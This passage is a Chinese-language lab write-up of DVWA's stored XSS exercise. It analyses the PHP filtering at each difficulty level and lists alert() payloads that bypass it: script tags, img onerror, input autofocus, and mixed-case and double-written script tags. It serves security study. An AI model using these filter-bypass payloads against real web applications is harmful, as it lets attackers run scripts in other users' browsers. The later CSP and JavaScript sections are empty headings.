	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitize name input
	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Update database
	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	//mysql_close();
}

?>

```

- if( isset( $_POST[ 'btnSign' ] ) ) 

  判断 `$_POST` 超全局数组中是否存在名为 `btnSign` 的字段，用来确认表单是否被提交。

  - isset()

    PHP 内置函数 判断一个变量是否已定义且不为 `null`

- $message = trim( $_POST[ 'mtxMessage' ] );

  去除 mtxMessage 首尾的空白字符

  - trim()

    PHP 内置函数 去除字符串两端的空格、换行符、制表符等

- $message = stripslashes( $message );

  对 `$message` 中的反斜杠进行去除，防止转义字符重复存在。

  - stripslashes()

    PHP 内置函数 删除字符串中的反斜杠 `\` 兼容早期 PHP 的 `magic_quotes_gpc` 机制

- $message = ((isset(...) && is_object(...)) ? mysqli_real_escape_string(...) : (...);

  对 `$message` 进行 SQL 转义

  - is_object()

    内置函数 判断变量是否为对象 这里用于确认数据库连接是否有效

  - mysqli_real_escape_string()

    PHP MySQLi 扩展函数 对字符串进行 SQL 特殊字符转义（防 SQL 注入）

  - trigger_error()

    PHP 内置函数 手动触发一个 PHP 错误

**low等级对于XSS注入没有做任何的防御动作**

### 漏洞利用

尝试

```
<script>alert('1')</script>
```

![](images/S-XSS-L-1.png)

出现弹框 脚本执行成功

![](images/S-XSS-L-2.png)

表单显示内容为空 因为浏览器将<script>标签识别为可执行代码

![](images/S-XSS-L-3.png)

### 小插曲 死循环

我又尝试了<img><input>两个标签

```
<img src=x onerror=alert(2)>
```

![](images/S-XSS-L-4.png)

![](images/S-XSS-L-5.png)

![](images/S-XSS-L-6.png)

![](images/S-XSS-L-7.png)

先后弹窗12结果与预想相同

```
<input onfocus=alert(3) autofocus>
```

![](images/S-XSS-L-8.png)

![](images/S-XSS-L-9.png)

![](images/S-XSS-L-10.png)

![](images/S-XSS-L-11.png)

![](images/S-XSS-L-12.png)

弹框13233333 并且陷入死循环 结果与预想先后弹窗123不同

原因：

- autofocus 浏览器在页面加载完成后，会自动把焦点放到这个 input 上

- onfocus=alert(3) 每一次元素获得焦点，都会触发

alert 本身会“打断”焦点状态

```
13233333顺序解释：
<script> → alert(1)
<input autofocus> → 获得焦点 → alert(3)
<img onerror> → 图片加载失败 → alert(2)
alert 关闭 → 焦点回到 input → alert(3)
再关闭 → 再 focus → alert(3)
无限重复……
进入：
onfocus + autofocus + alert 浏览器焦点抖动死循环
```



## Medium

### 源码分析

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?> 
```

- $message = strip_tags( addslashes( $message ) );

  删除所有 HTML 标签

  - addslashes()

    PHP 内置函数 添加反斜杠 ‘ “ \ NULL

  - strip_tags()

    删除字符串中的所有 HTML 和 PHP 标签

- $message = htmlspecialchars( $message );

  将 `$message` 中的 HTML 特殊字符转换为对应的 HTML 实体

  - htmlspecialchars()

    PHP 内置函数 将字符串中的 HTML 特殊字符 转换为 HTML 实体，从而使其在页面中只作为普通文本显示，而不会被浏览器当成 HTML 或 JavaScript 执行。

    ```
    用户输入
    <script>alert(1)</script>
    转换后
    &lt;script&gt;alert(1)&lt;/script&gt
    ```

- $name = str_replace( '<script>', '', $name );

  删除用户输入的 name 中的 `<script>` 标签

**对于message**

​	**过滤所有 HTML / PHP 标签**

​	**转义HTML 特殊字符**

**对于name**

​	**删除<script>字符串**

### 漏洞利用

**对于message** **所有HTML和PHP标签都会被过滤**

```
<script>alert(1)</script>
```

![](images/S-XSS-M-1.png)

```
<img src=x onerror=alert(2)>
```

![](images/S-XSS-M-2.png)

```
<scr ipt>alert(3)</scr ipt> 添加空格处理
```

![](images/S-XSS-M-3.png)

```
<ScRiPt>alert(4)</ScRiPt> 大小写混用
```

![](images/S-XSS-M-4.png)

**和预想结果一致，全部都被识别为标签过滤**

![](images/S-XSS-M-5.png)

**对于name 删除了<script>字符串**

前端长度限制10

![](images/S-XSS-M-6.png)

打开前端将长度限制10改为100

![](images/S-XSS-M-7.png)

![](images/S-XSS-M-8.png)

- 大小写混用绕过

```
<Script>alert(1)</Script>
```

![](images/S-XSS-M-9.png)

注入成功

![](images/S-XSS-M-10.png)

- 双写绕过

```
<scr<script>ipt>alert(1)</scr<script>ipt>
```

![](images/S-XSS-M-11.png)

注入成功

![](images/S-XSS-M-12.png)

## High

### 源码分析

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = ...

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ...

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?> 
```

相比于Medium，High等级对于name有更严格的过滤，其它的处理都不变

```
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
```

在 `< >` 中，字符顺序能拼出 s c r i p t，就删掉整段

不过用其他标签即可绕过

### 漏洞利用

与Medium流程相同

打开前端将长度限制10改为100

![](images/S-XSS-H-1.png)

- 使用其他标签

```
<img src=x onerror=alert(1)>
```

![](images/S-XSS-H-2.png)

注入成功

## Impossible

**Impossible等级里 name采用了和message一样严格的过滤机制 那就没有小后门可以钻了**



# CSP 绕过（CSP Bypass）

## Low

### 源码分析

### 漏洞利用

## Medium

### 源码分析

### 漏洞利用

## High

### 源码分析

### 漏洞利用

## Impossible

### 源码分析

### 漏洞利用

# JavaScript 攻击（JavaScript）

## Low

### 源码分析

### 漏洞利用

## Medium

### 源码分析

### 漏洞利用

## High

### 源码分析

### 漏洞利用

## Impossible

### 源码分析

### 漏洞利用
